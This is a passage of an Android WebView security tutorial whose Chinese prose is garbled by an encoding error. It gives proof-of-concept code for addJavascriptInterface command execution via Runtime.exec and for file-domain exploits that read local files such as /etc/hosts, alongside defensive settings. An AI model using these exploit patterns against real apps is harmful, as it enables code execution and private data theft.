class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// é€šè¿‡Handlerå‘é€æ¶ˆæ¯</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">                 <span class="comment">// æ³¨æ„è°ƒç”¨çš„JSæ–¹æ³•åè¦å¯¹åº”ä¸Š</span></span><br><span class="line">                 <span class="comment">// è°ƒç”¨javascriptçš„callJS()æ–¹æ³•</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"> </span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// ç”±äºè®¾ç½®äº†å¼¹çª—æ£€éªŒè°ƒç”¨ç»“æœ,æ‰€ä»¥éœ€è¦æ”¯æŒjså¯¹è¯æ¡†</span></span><br><span class="line"> <span class="comment">// webviewåªæ˜¯è½½ä½“ï¼Œå†…å®¹çš„æ¸²æŸ“éœ€è¦ä½¿ç”¨webviewChromClientç±»å»å®ç°</span></span><br><span class="line"> <span class="comment">// é€šè¿‡è®¾ç½®WebChromeClientå¯¹è±¡å¤„ç†JavaScriptçš„å¯¹è¯æ¡†</span></span><br><span class="line"> <span class="comment">//è®¾ç½®å“åº”js çš„Alert()å‡½æ•°</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure>
<p><strong>ç‰¹åˆ«æ³¨æ„ï¼šJSä»£ç è°ƒç”¨ä¸€å®šè¦åœ¨ <code>onPageFinishedï¼ˆï¼‰</code> å›è°ƒä¹‹åæ‰èƒ½è°ƒç”¨ï¼Œå¦åˆ™ä¸ä¼šè°ƒç”¨</strong></p>
<p>onPageFinished()å±äºWebViewClientç±»çš„æ–¹æ³•ï¼Œä¸»è¦åœ¨é¡µé¢åŠ è½½ç»“æŸæ—¶è°ƒç”¨</p>
<p>è¿˜å¯ä»¥ä½¿ç”¨**WebView.evaluateJavascript()**è°ƒç”¨jsä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨evaluateJavascriptæ¥åŠ è½½</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//æ­¤å¤„ä¸º js è¿”å›çš„ç»“æœ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Webviewæ¼æ´-2">Webviewæ¼æ´</h3>
<h4 id="æ¼æ´ç±»å‹æ¦‚æ‹¬">æ¼æ´ç±»å‹æ¦‚æ‹¬</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bbs.kanxue.com/upload/attach/202207/905443_E25ZWREXH5JZHN2.png" alt="image-20220729145936266"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_C8YTUCX4746WZHB-17271001469662.png" alt="image-20220729152654652"></p>
<h4 id="å†å²æ¼æ´">å†å²æ¼æ´</h4>
<h5 id="Webviewä»»æ„ä»£ç æ‰§è¡Œæ¼æ´">Webviewä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</h5>
<p><strong>addJavascriptInterfaceæ¥å£å¼•èµ·è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong></p>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>JSå’ŒAndroidçš„ç›´æ¥é€šä¿¡å¯ä»¥é€šè¿‡addJavascriptInterfaceæ¥å£è¿›è¡Œå¯¹è±¡æ˜ å°„</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> JSObject(), <span class="string">&quot;myObj&quot;</span>);</span><br><span class="line"><span class="comment">// å‚æ•°1ï¼šAndroidçš„æœ¬åœ°å¯¹è±¡</span></span><br><span class="line"><span class="comment">// å‚æ•°2ï¼šJSçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment">// é€šè¿‡å¯¹è±¡æ˜ å°„å°†Androidä¸­çš„æœ¬åœ°å¯¹è±¡å’ŒJSä¸­çš„å¯¹è±¡è¿›è¡Œå…³è”ï¼Œä»è€Œå®ç°JSè°ƒç”¨Androidçš„å¯¹è±¡å’Œæ–¹æ³•</span></span><br></pre></td></tr></table></figure>
<p>å½“JSæ‹¿åˆ°Androidè¿™ä¸ªå¯¹è±¡åï¼Œå°±å¯ä»¥è°ƒç”¨è¿™ä¸ªAndroidå¯¹è±¡ä¸­æ‰€æœ‰çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ç³»ç»Ÿç±»ï¼ˆjava.lang.Runtime ç±»ï¼‰ï¼Œä»è€Œè¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>å…·ä½“çš„æ”»å‡»æ­¥éª¤ï¼š</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰Androidä¸­çš„å¯¹è±¡æœ‰ä¸€å…¬å…±çš„æ–¹æ³•ï¼šgetClass()</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰è¯¥æ–¹æ³•å¯ä»¥è·å–åˆ°å½“å‰ç±» ç±»å‹<span class="keyword">Class</span></span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰è¯¥ç±»æœ‰ä¸€å…³é”®çš„æ–¹æ³•ï¼š <span class="keyword">Class</span>.forNameï¼›</span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰è¯¥æ–¹æ³•å¯ä»¥åŠ è½½ä¸€ä¸ªç±»ï¼ˆå¯åŠ è½½ java.lang.<span class="keyword">Runtime</span> ç±»ï¼‰</span><br><span class="line">ï¼ˆ<span class="number">5</span>ï¼‰è€Œè¯¥ç±»æ˜¯å¯ä»¥æ‰§è¡Œæœ¬åœ°å‘½ä»¤çš„</span><br></pre></td></tr></table></figure>
<p><strong>ç¤ºä¾‹ä»£ç </strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// æ­¥éª¤1ï¼šéå† window å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// ç›®çš„æ˜¯ä¸ºäº†æ‰¾åˆ°åŒ…å« getClass ï¼ˆï¼‰çš„å¯¹è±¡</span></span><br><span class="line">    <span class="comment">// å› ä¸ºAndroidæ˜ å°„çš„JSå¯¹è±¡ä¹Ÿåœ¨windowä¸­ï¼Œæ‰€ä»¥è‚¯å®šä¼šéå†åˆ°</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj in window) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123; </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ­¥éª¤2ï¼šåˆ©ç”¨åå°„è°ƒç”¨forNameï¼ˆï¼‰å¾—åˆ°Runtimeç±»å¯¹è±¡</span></span><br><span class="line">            alert(obj);         </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>) </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ­¥éª¤3ï¼šä»¥åï¼Œå°±å¯ä»¥è°ƒç”¨é™æ€æ–¹æ³•æ¥æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œæ¯”å¦‚è®¿é—®æ–‡ä»¶çš„å‘½ä»¤</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä»æ‰§è¡Œå‘½ä»¤åè¿”å›çš„è¾“å…¥æµä¸­å¾—åˆ°å­—ç¬¦ä¸²ï¼Œæœ‰å¾ˆä¸¥é‡æš´éœ²éšç§çš„å±é™©ã€‚</span></span><br><span class="line"><span class="comment">// å¦‚æ‰§è¡Œå®Œè®¿é—®æ–‡ä»¶çš„å‘½ä»¤ä¹‹åï¼Œå°±å¯ä»¥å¾—åˆ°æ–‡ä»¶åçš„ä¿¡æ¯äº†ã€‚</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>æ¼æ´é˜²æŠ¤</strong></p>
<p>Googleåœ¨Android4.2ä»¥åå¯¹è°ƒç”¨çš„å‡½æ•°ä»¥<code>@JavascriptInterface</code>è¿›è¡Œæ³¨è§£ä»è€Œé¿å…æ¼æ´æ”»å‡»ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬jsè°ƒç”¨Androidçš„æ–¹æ³•ï¼Œå¿…é¡»è¦åœ¨JavascriptInterfaceä¸­è¿›è¡Œå£°æ˜ï¼Œè¿™æ ·æ‰èƒ½è°ƒç”¨ã€‚</p>
<h5 id="webviewæ˜æ–‡å­˜å‚¨æ¼æ´">webviewæ˜æ–‡å­˜å‚¨æ¼æ´</h5>
<p>WebViewé»˜è®¤å¼€å¯å¯†ç ä¿å­˜åŠŸèƒ½ ï¼š</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setSavePassword(<span class="literal">true</span>)`</span><br></pre></td></tr></table></figure>
<p>å¼€å¯åï¼Œåœ¨ç”¨æˆ·è¾“å…¥å¯†ç æ—¶ï¼Œä¼šå¼¹å‡ºæç¤ºæ¡†ï¼šè¯¢é—®ç”¨æˆ·æ˜¯å¦ä¿å­˜å¯†ç ï¼›</p>
<p>å¦‚æœé€‰æ‹©â€æ˜¯â€ï¼Œå¯†ç ä¼šè¢«æ˜æ–‡ä¿åˆ° <code>/data/data/com.package.name/databases/webview.db</code> ä¸­ï¼Œè¿™æ ·å°±æœ‰è¢«ç›—å–å¯†ç çš„å±é™©</p>
<p><strong>å®‰å…¨é˜²æŠ¤ï¼š</strong></p>
<p>é€šè¿‡ WebSettings.setSavePassword(false) å…³é—­å¯†ç ä¿å­˜æé†’åŠŸèƒ½ï¼Œé˜²æ­¢æ˜æ–‡å¯†ç å­˜åœ¨æœ¬åœ°è¢«ç›—ç”¨ã€‚</p>
<h4 id="è·¨åŸŸæ¼æ´"><strong>è·¨åŸŸæ¼æ´</strong></h4>
<p>WebViewå¼€å¯äº†fileåŸŸè®¿é—®ï¼Œä¸”å…è®¸fileåŸŸå¯¹httpåŸŸè¿›è¡Œè®¿é—®ï¼ŒåŒæ—¶æœªå¯¹fileåŸŸçš„è·¯å¾„è¿›è¡Œä¸¥æ ¼é™åˆ¶æ‰€è‡´ï¼Œæ”»å‡»è€…é€šè¿‡URL Schemeçš„æ–¹å¼ï¼Œå¯è¿œç¨‹æ‰“å¼€å¹¶åŠ è½½æ¶æ„HTMLæ–‡ä»¶ï¼Œè¿œç¨‹è·å–appä¸­åŒ…æ‹¬ç”¨æˆ·ç™»å½•å‡­è¯åœ¨å†…çš„æ‰€æœ‰æœ¬åœ°æ•æ„Ÿæ•°æ®ã€‚</p>
<p>é’ˆå¯¹è¿™ä¸ªæ¼æ´ï¼Œæ¶‰åŠå¦‚ä¸‹å‡ ä¸ªapiå‡½æ•°ï¼š</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240930170405744.png" alt="image-20240930170405744"></p>
<h5 id="ä»»æ„æ–‡ä»¶çªƒå–-åº”ç”¨å…‹éš†æ¼æ´">ä»»æ„æ–‡ä»¶çªƒå–(åº”ç”¨å…‹éš†æ¼æ´)</h5>
<p><strong>æ¼æ´åŸç†</strong></p>
<p>setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</p>
<p>è¿™æ ·ä½¿å¾—WebViewå¯ä»¥ä½¿ç”¨Fileåè®®å’ŒåŠ è½½jsä»£ç è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œè¿™æ ·ä¼šå¯¼è‡´æ”»å‡»è€…æ“ä½œç”¨æˆ·ç‚¹å‡»åæ— æ„ŸçŸ¥ä¸‹è½½æ¶æ„çš„HTML/JSï¼Œå¹¶çªƒå–ç›¸å…³çš„ç§æœ‰æ–‡ä»¶ä¿¡æ¯ã€‚</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢Androidæ‰‹æœºä¸­çš„<code>/etc/hosts</code>ç§æœ‰æ–‡ä»¶ä¿¡æ¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_D6RRGQX47ZWBV4B.png" alt="image-20220729195648955"></p>
<p>ç¼–å†™ä¸€ä¸ªjsæ–‡ä»¶æ¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼š<strong>fileAttack.html</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;file:///etc/hosts&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)  <span class="comment">//å½“XMLHttpRequestå‘ç”Ÿå˜åŒ–æ—¶ è§¦å‘å›è°ƒ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)          <span class="comment">//è¯·æ±‚æ˜¯å¦å®Œæˆ     </span></span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å°†è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ è‡³æ‰‹æœº /data/local/tmpä¸‹</p>
<p>ç¼–å†™æ”»å‡»ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//è®¾ç½®æ˜¯å¦å…è®¸ WebView ä½¿ç”¨ File åè®®</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è®¾ç½®æ˜¯å¦å…è®¸ WebView ä½¿ç”¨ JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> 	  webView.getSettings().setAllowFileAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå°±è·å–äº†ç›¸åº”çš„ç§æœ‰æ–‡ä»¶ä¿¡æ¯ï¼Œè€Œä¸”åŠ è½½äº†æˆ‘ä»¬çš„æ¶æ„htmlæ–‡ä»¶</p>
<h5 id="é€šç”¨åè®®æ¼æ´-æ¶æ„é¡µé¢æ³¨å…¥">é€šç”¨åè®®æ¼æ´(æ¶æ„é¡µé¢æ³¨å…¥)</h5>
<p>setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)</p>
<p>ç”¨åŒæ ·çš„æ–¹å¼æµ‹è¯• setAllowUniversalAccessFromFileURLs çš„å€¼ï¼Œå½“ setAllowUniversalAccessFromFileURLs çš„å€¼ä¸º true æ—¶ï¼Œå¯ä»¥åˆ©ç”¨ js æ¥è®¿é—®æ¶æ„ç½‘ç«™ï¼ˆHTTP æˆ– HTTPSï¼‰çš„é“¾æ¥</p>
<p>æˆ‘ä»¬å°†ä¸Šé¢htmlä¸­çš„è®¿é—®æ”¹ä¸ºçœ‹é›ªçš„ç½‘ç«™ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;https://bbs.pediy.com/&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status is&quot;+xmlhttp.status);</span></span><br><span class="line">        <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span>==<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(xmlhttp.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,arm);</span><br><span class="line">    xmlhttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">loadXMLDoc</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>ç„¶åå¼€å¯setAllowUniversalAccessFromFileURLs å‡½æ•°API,å¹¶è¿è¡Œ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">      setContentView(R.layout.activity_file_web_view);</span><br><span class="line">      <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webview0);</span><br><span class="line">      <span class="comment">//è®¾ç½®æ˜¯å¦å…è®¸ WebView ä½¿ç”¨ File åè®®</span></span><br><span class="line">      webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">      <span class="comment">//è®¾ç½®æ˜¯å¦å…è®¸ WebView ä½¿ç”¨ JavaScript</span></span><br><span class="line">      webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> 	  webView.getSettings().setAllowUniversalAccessFromFileURLs(<span class="literal">true</span>);</span><br><span class="line">      </span><br><span class="line">      webView.loadUrl(<span class="string">&quot;file:///data/local/tmp/fileAttack.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°è¿™é‡Œæˆ‘ä»¬æ³¨å…¥htmlåè¿˜å¯ä»¥å»è®¿é—®ç½‘ç«™ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨è„šæœ¬ä¸­ä½¿å…¶è®¿é—®æ¶æ„çš„ç½‘ç«™ç•Œé¢ï¼Œå¹¶è¿”å›è¿™æ ·å°±å¯ä»¥è¿›è¡Œæ¶æ„ç•Œé¢çš„æ³¨å…¥</p>
<h5 id="å®‰å…¨é˜²æŠ¤-2"><strong>å®‰å…¨é˜²æŠ¤</strong></h5>
<ul>
<li>æ£€æŸ¥åº”ç”¨æ˜¯å¦ä½¿ç”¨äº†webviewæ§ä»¶</li>
<li>é¿å…appå†…éƒ¨çš„webviewè¢«ä¸ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹è°ƒç”¨ï¼Œæ’æŸ¥å†…ç½®webviewçš„activityæ˜¯å¦è¢«å¯¼å‡ºï¼Œå¿…é¡»å¯¼å‡ºçš„activityæ˜¯å¦ä¼šé€šè¿‡å‚æ•°ä¼ é€’è°ƒèµ·å†…ç½®çš„webview</li>
<li>fileåŸŸè®¿é—®ä¸ºéå¿…è¦åŠŸèƒ½éœ€æ±‚æ—¶ï¼Œæ‰‹åŠ¨é…ç½® setAllowFileAccessFromFileURLs æˆ– setAllowUniversalAccessFromFileURLs ä¸¤ä¸ª API ä¸º falseï¼ˆAndroid 4.1 ç‰ˆæœ¬ä¹‹å‰è¿™ä¸¤ä¸ª API é»˜è®¤æ˜¯ trueï¼Œéœ€è¦æ˜¾å¼è®¾ç½®ä¸º falseï¼‰ï¼›</li>
</ul>
<p>è‹¥è¦å¼€å¯fileåŸŸè®¿é—®ï¼Œåˆ™è®¾ç½®fileè·¯å¾„çš„ç™½åå•ï¼Œä¸¥æ ¼æ§åˆ¶fileåŸŸè®¿é—®èŒƒå›´ï¼Œå…·ä½“å¦‚ä¸‹</p>
<ul>
<li>å›ºå®šä¸å˜çš„ HTML æ–‡ä»¶å¯ä»¥æ”¾åœ¨ assets æˆ– res ç›®å½•ä¸‹ï¼Œfile:///android_asset å’Œ file:///android_res åœ¨ä¸å¼€å¯ API çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥è®¿é—®ï¼›</li>
<li>å¯èƒ½ä¼šæ›´æ–°çš„ HTML æ–‡ä»¶æ”¾åœ¨ /data/data/(app) ç›®å½•ä¸‹ï¼Œé¿å…è¢«ç¬¬ä¸‰æ–¹æ›¿æ¢æˆ–ä¿®æ”¹ï¼›</li>
<li>å¯¹ file åŸŸè¯·æ±‚åšç™½åå•é™åˆ¶æ—¶ï¼Œéœ€è¦å¯¹â€œâ€¦/â€¦/â€ç‰¹æ®Šæƒ…å†µè¿›è¡Œå¤„ç†ï¼Œé¿å…ç™½åå•è¢«ç»•è¿‡ã€‚</li>
</ul>
<h5 id="ç¬¦å·é“¾æ¥è·¨æºæ”»å‡»">ç¬¦å·é“¾æ¥è·¨æºæ”»å‡»</h5>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35993502/article/details/121371049">Androidå®‰å…¨æ£€æµ‹ï¼WebView FileåŸŸåŒæºç­–ç•¥ç»•è¿‡æ¼æ´</a></p>
<p>è¿™ç±»æ¼æ´ï¼Œåªæœ‰<strong>setAllowFileAccessä¸ºTrue</strong></p>
<p><strong>æ¼æ´åŸç†</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_NW7GHWBMGDNE5TU.png" alt="image-20220729202532795"></p>
